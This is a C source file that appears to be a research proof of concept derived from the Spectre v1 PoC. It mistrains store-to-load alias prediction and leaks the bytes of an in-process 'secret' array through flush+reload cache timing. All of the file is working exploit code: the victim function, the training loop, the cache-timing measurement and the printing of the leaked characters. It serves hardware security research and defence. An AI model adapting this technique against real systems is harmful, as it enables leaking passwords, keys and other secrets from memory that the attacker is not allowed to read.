/*********************************************************************
*
* This source code is based off the Spectre v1 PoC
* found at https://github.com/crozone/SpectrePoC.git
*
**********************************************************************/

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>

// #include <x86intrin.h> /* for rdtsc, rdtscp, clflush */

#include <unistd.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>

#include "cacheutils.h"
#define PAGE_SIZE 4096

#define NUM_PAGES 1024
#define NUM_BAGS (PAGE_SIZE/(sizeof(int32_t)))

/********************************************************************
Victim code.
********************************************************************/
unsigned int array1_size = 16;
uint8_t unused1[64];
uint32_t array1[16] = { 0xb0, 0xb1, 0xb2, 0xb3, 0xb4, 0xb5, 0xb6, 0xb7, 0xb8, 0xb9, 0xba, 0xbb, 0xbc, 0xbd, 0xbe, 0xbf };
uint8_t unused2[64];
uint8_t oracle[256 * PAGE_SIZE];
int32_t big_block[PAGE_SIZE];
volatile int32_t* load_addrs[NUM_PAGES];
volatile int32_t store_addrs[NUM_BAGS];
int32_t** alias_q;

const uint32_t secret[] = {'S', 'E', 'C', 'R', 'E', 'T'};

uint8_t temp = 0; /* Used so compiler won't optimize out victim_function() */


/* By training the aliasing detection, we can cause *load_addr to load the
 * value stored at *store_addr even when store_addr != load_addr. We abuse this
 * to read and leak values of secret[] through *load_addr, despite *load_addr
 * never actually containing these values. */
void victim_function(size_t x, volatile int32_t* store_addr, register volatile int32_t* load_addr) {
 // printf("store_addr: %p load_addr: %p    x: %p   malicious pass: %p   \n", store_addr, load_addr, x, mal);

  *store_addr = array1[x];
  // placing an lfence here after the store prevents the vulnerability
//          alias_p = (int32_t*)(training_alias ^ (x & (malicious_alias ^ training_alias)));
  if (load_addr == store_addr) asm volatile("lfence");

 temp &= oracle[(*(load_addr)) * PAGE_SIZE];
 //  temp &= oracle[(*((int32_t*)(training_alias ^ (x & (malicious_alias ^ training_alias))))-1) * PAGE_SIZE];
}


/********************************************************************
Analysis code
********************************************************************/

/* Find accessed cache lines corresponding to ASCII values */
void readMemoryByte(size_t malicious_x, int results[256], int pagenum, int dropnum) {
  int tries, i, j, k, mix_i;
  unsigned int junk = 0;
  size_t training_x, x;
  register uint64_t time1, time2;
  volatile uint8_t * addr;


  for (i = 0; i < 256; i++)
    flush(oracle + i * PAGE_SIZE);
    
  for (i = 0; i < 256; i++)
    results[i] = 0;

  for (tries = 1999; tries > 0; tries--) {

    /* Flush oracle[256*(0..255)] from cache */
  
    training_x = tries % array1_size;
    volatile int32_t* store_p = &store_addrs[dropnum];
    uint64_t training_alias = (uint64_t)store_p;
    uint64_t malicious_alias = (uint64_t)load_addrs[pagenum+3];
    int32_t* alias_p;
    for (int k = 0; k < 10; k++) {
      for (j = 24; j >= 0; j--) {
        /* Bit twiddling to set x=training_x if j%25!=0 or malicious_x if j%25==0 */
        /* Avoid jumps in case those tip off the branch predictor */
        x = (j - 1) & ~0xFFFF; /* Set x=FFF.FF0000 if j%25==0, else x=0 */
        x = (x | (x >> 16)); /* Set x=-1 if j&25=0, else x=0 */

        // set alias_p to truly alias the store_addr if j%25!=0,
        // and NOT alias the store_addr if j%25==0
        alias_p = (int32_t*)(training_alias ^ (x & (malicious_alias ^ training_alias)));
        // printf("%p, %p, %p\n", &store_addrs[dropnum], load_addrs[pagenum], alias_p);
        x = training_x ^ (x & (malicious_x ^ training_x));
        // printf("%lx\n", x);

        flush( (int32_t*)malicious_alias);

        /* Delay */
        for (volatile int z = 0; z < 400; z++) {}
        mfence();

        /* Call the victim! */
        victim_function(x, store_p, alias_p);
      }
      *store_p = 'a';
    }

    /* Time reads. Order is lightly mixed up to prevent stride prediction */
    for (i = 0; i < 256; i++) {
      mix_i = ((i * 167) + 13) & 255;
      if(flush_reload(oracle + mix_i * PAGE_SIZE))
        results[mix_i]++; /* cache hit - add +1 to score for this value */
    }

    /* Detect cache lines */
  }
  printf(">");
  for (i = 32; i < 128; i++) { // printable range
    if (results[i] > 0) {
#if COLORS
      if (i == array1[malicious_x])
        printf("\x1b[1;41m");
#endif
      printf("%c", i);
#if COLORS
      if (i == array1[malicious_x])
        printf("\x1b[0m");
#endif
    }
  }
  printf("< ");
  for (i = 0; i < 256; i++) {
    if (results[i] > 0) {
      printf("%02x/%d ", i, results[i]);
    }
  }
  results[0] ^= junk; /* use junk so code above won't get optimized out*/
}

/*
*  Command line arguments:
*  1: Cache hit threshold (int)
*  2: Malicious address start (size_t)
*  3: Malicious address count (int)
*/
int main(int argc,
  const char * * argv) {
  
  /* Default to a cache hit threshold of 80 */
  CACHE_MISS = detect_flush_reload_threshold();
  printf("CACHE_MISS Threshold %lu\n", CACHE_MISS);

  /* Default for malicious_x is the secret string address */
  size_t malicious_x = (size_t)(secret -  array1);
  
  /* Default addresses to read is 40 (which is the length of the secret string) */
  int len = sizeof(secret)/ sizeof(int32_t);
  
  int i;

  alias_q = malloc(PAGE_SIZE);


  int fd = open("mmap", O_CREAT | O_TRUNC | O_RDWR, S_IRUSR | S_IWUSR);
  if (fd < 1) {
    perror(NULL);
    exit(1);
  }
  ftruncate(fd, PAGE_SIZE * NUM_PAGES);
  int32_t* mmap_base = mmap(NULL, PAGE_SIZE * NUM_PAGES, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);

  // arbitrarily chosen
  int dropnum = 33;

  uint64_t alias_base = (uint64_t)mmap_base;
  // touch all the pages
  for (i = 0; i < NUM_PAGES; i++) {
    load_addrs[i] = (int32_t*)((((uint64_t)&store_addrs[dropnum]) & 0xfff) + (alias_base + i * PAGE_SIZE));
    *(load_addrs[i]) = 0xDD;
  }

  // arbitrarily chosen
  int pagenum = 4;

  // offset so lower bits don't match
  //load_addrs[pagenum] = (int32_t*)(((uint64_t)load_addrs[pagenum]) + 37);

  printf("store_addr: %p\n load_addr: %p\n      mmap: %p\n      diff: 0x%012lx\n", &store_addrs[dropnum], load_addrs[pagenum], mmap_base, (uint64_t)load_addrs[pagenum] - (uint64_t)mmap_base);
  printf("&array1_size: %p\n", &array1_size);

  // touch the chosen page again just to be sure
  *(load_addrs[pagenum]) = 0xCC;

  for (i = 0; i < (int)sizeof(oracle); i++) {
    oracle[i] = 1; /* write to oracle so in RAM not copy-on-write zero pages */
  }


  int results[256];

  printf("Reading %d bytes:\n", len);

  /* Start the read loop to read each address */
  i = 0;
  while (--len >= 0) {
    printf("Reading at malicious_x = %p... ", (void * ) malicious_x);

    /* Call readMemoryByte with the required cache hit threshold and
         malicious x address.
       Output is of the form xx/nnnn, where xx is the cached index and nnnn is
         the number of detected hits.
       Any detected ASCII characters are printed between the >< arrows.
    */
    readMemoryByte(malicious_x++, results, pagenum, dropnum);

    i++;
    printf("\n");
  }
  return (0);
}
